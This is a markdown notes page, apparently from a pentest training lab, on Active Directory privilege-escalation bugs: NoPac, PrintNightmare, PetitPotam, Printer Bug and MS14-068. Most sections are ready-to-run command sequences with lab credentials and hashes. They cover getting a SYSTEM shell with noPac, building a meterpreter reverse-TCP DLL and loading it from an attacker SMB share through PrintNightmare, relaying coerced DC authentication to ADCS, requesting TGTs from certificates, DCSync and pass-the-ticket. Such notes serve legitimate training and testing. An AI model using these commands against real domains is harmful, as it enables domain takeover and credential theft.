---
tags: [ad, linux, ad-vuln, impacket]
aliases: [AD Vulnerabilities]
---
# NoPac

Allows intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. This vulnerability leverages
- CVE-2021-42278 which is a bypass in the Security Account Manager (SAM)
- CVE-2021-42287 a vulnerability in the Kerberos Privilege Attribute Certificate (PAC) in ADDS.

This exploit takes advantage of being able to change the SamAccountName of a comuter account to that of a domain controller. By default, authenticated users can add up to ten computers to a domain, when doing so we change the name of the new host to match a DC's SamAccountName. The kerberos tickets are then sent to the DC's name instead of the new name, they will be issued to the closest match. We will then have access to whatever context that ticket had to get a SYSTEM shell. 

```shell
git clone https://github.com/Ridter/noPac.git

# scan for nopac
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

# running and getting a shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# DCSync the Administrator account
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

> `smbexec.py` creates a service called BTOBTO and another service called BTOBO and when any command we type is sent to the target over SMB, it is issued inside a .bat file called execute.bat. Every time a new command is typed a new batch script is created and echoed to a temp file. Windows Defender will very easily detect such behavior so if opsec is necessary we should avoid using such a tool.

# PrintNightmare

Vulnerability in the PrintSpooler service that runs on all Windows OSes.

```shell
# enumerating to see if the service is exposed on the target
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# generating a DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# creating a share
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# start the msf handler

# run the exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

# PetitPotam

LSA spoofing vulnerability that allows an unauthenticated attacker to coerce a DC to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing the Encrypting File System Remote Protocol (MS-EFSRPC). An authentication request from the targeted Domain Controller is relayed to the CA host's Web Enrollment page and make a Certificate Signing Request to a new digital request. Then domain compromise can be done via a DCSync attack.

```shell
# for CA
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# coerce the DC to authenticate to our host
python3 PetitPotam.py 172.16.5.225 172.16.5.5    

# requesting the TGT after having acquired the base64 certificate
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

# setting the env variable
export KRB5CCNAME=dc01.ccache

# DCSync
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCA

# confirm admin access
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

```shell
# once we have the TGT we could also request the NT hash for our target host
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

```powershell
# we could also use the certificate to request a TGT and perform PTT attack
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# confirm the ticket is in memory
klist
```

# Printer Bug

Flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. Any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method and froce the server to authenticate to any host provided by the client over SMB.

The spooler service runs as SYSTEM and is installed by default in Windows server running Desktop Experience. 

The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.

We can check for this vuln with [this](https://github.com/itzvenom/Security-Assessment-PS) or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket).

```powershell
# if repo is installed on the target machine
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

# MS14-068

Flaw in the Kerberos Protocol which could be leverage to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching.

## Related

- [[kerberoasting]]
- [[enumeration]]
- [[credential-enumeration]]
- [[double-hop]]

